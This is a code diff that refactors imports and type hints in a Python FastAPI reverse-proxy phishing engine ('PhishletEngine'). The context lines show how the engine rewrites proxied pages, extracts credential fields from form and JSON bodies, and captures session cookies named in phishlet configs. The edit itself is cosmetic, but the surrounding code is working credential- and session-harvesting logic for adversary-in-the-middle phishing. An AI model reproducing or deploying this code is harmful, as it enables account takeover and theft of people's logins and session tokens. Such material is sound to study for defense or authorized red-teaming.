@@ -1,13 +1,15 @@
-import yaml
-from core.event_bus import publish_event
-import re
-from datetime import datetime
-import httpx
-import uvicorn
 import logging
 import os
-from typing import Dict, Any, Optional, List
+import re
+from datetime import datetime
+from typing import Any, Dict, List, Optional
+
+import httpx
+import uvicorn
+import yaml
 from fastapi import FastAPI, Request, Response
+
+from core.event_bus import publish_event
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
@@ -26,21 +28,21 @@ class PhishletEngine:
         self.name = self.config.get('name', 'Unknown')
         self.allowed_domains = self._load_allowed_domains()
 
-    def _load_config(self) -> Dict[str, Any]:
+    def _load_config(self) -> dict[str, Any]:
         if not os.path.exists(self.phishlet_path):
             logger.error(f"Phishlet file not found: {self.phishlet_path}")
             return {}
         with open(self.phishlet_path, 'r') as f:
             return yaml.safe_load(f)
 
-    def _load_allowed_domains(self) -> List[str]:
+    def _load_allowed_domains(self) -> list[str]:
         wl_env = os.getenv("WHITELIST_DOMAINS", "")
         wl_cfg = self.config.get("allowed_domains", [])
-        domains = set([d.strip().lower() for d in wl_cfg if isinstance(d, str)])
+        domains = {d.strip().lower() for d in wl_cfg if isinstance(d, str)}
         if wl_env:
             for d in wl_env.split(","):
                 domains.add(d.strip().lower())
-        return sorted(list(domains))
+        return sorted(domains)
 
     def get_target_url(self, subdomain: str, path: str) -> str:
         # Simplified logic: find the domain associated with the subdomain
@@ -50,7 +52,7 @@ class PhishletEngine:
         # Fallback to main domain if not found (or if subdomain is empty/www)
         return f"https://{self.target_domain}{path}"
 
-    def process_content(self, content: bytes, hostname: str, content_type: Optional[str] = None) -> bytes:
+    def process_content(self, content: bytes, hostname: str, content_type: str | None = None) -> bytes:
         try:
             decoded_content = content.decode('utf-8', errors='ignore')
             
@@ -58,7 +60,7 @@ class PhishletEngine:
             for filter_rule in self.sub_filters:
                 search_pattern = filter_rule.get('search', '')
                 replace_pattern = filter_rule.get('replace', '').replace('{hostname}', hostname)
-                mimes: List[str] = filter_rule.get('mimes', [])
+                mimes: list[str] = filter_rule.get('mimes', [])
                 if mimes and content_type:
                     allowed = any(mime in content_type for mime in mimes)
                     if not allowed:
@@ -90,7 +92,7 @@ class PhishletEngine:
                             captured[field] = match.group(1)
                     # Or JSON
                     elif f'\"{key}\"' in decoded_body:
-                         match = re.search(f'\"{key}\"\s*:\s*\"([^\"]*)\"', decoded_body)
+                         match = re.search(f'\"{key}\"\\s*:\\s*\"([^\"]*)\"', decoded_body)
                          if match:
                              captured[field] = match.group(1)
 
@@ -112,15 +114,15 @@ class PhishletEngine:
         except Exception as e:
             logger.error(f"Error capturing credentials: {e}")
     
-    def capture_tokens_from_headers(self, path: str, headers: Dict[str, str]):
+    def capture_tokens_from_headers(self, path: str, headers: dict[str, str]):
         try:
             # Handle both cases for header casing
             set_cookie = headers.get("set-cookie") or headers.get("Set-Cookie")
             if not set_cookie:
                 return
-            captured: Dict[str, str] = {}
+            captured: dict[str, str] = {}
             for token_cfg in self.auth_tokens:
-                keys: List[str] = token_cfg.get("keys", [])
+                keys: list[str] = token_cfg.get("keys", [])
                 for k in keys:
                     m = re.search(rf"{re.escape(k)}=([^;]+)", set_cookie)
                     if m:
@@ -135,7 +137,7 @@ class PhishletEngine:
             logger.error(f"Error capturing tokens: {e}")
 
 app = FastAPI()
-engine: Optional[PhishletEngine] = None
+engine: PhishletEngine | None = None
 
 @app.on_event("startup")
 async def startup_event():
@@ -203,7 +205,7 @@ async def proxy(request: Request, path: str):
             )
         except Exception as e:
             logger.error(f"Proxy error: {e}")
-            return Response(f"Proxy Error: {str(e)}", status_code=502)
+            return Response(f"Proxy Error: {e!s}", status_code=502)
 
         # Process response content
         content_type = proxy_resp.headers.get("content-type", "")
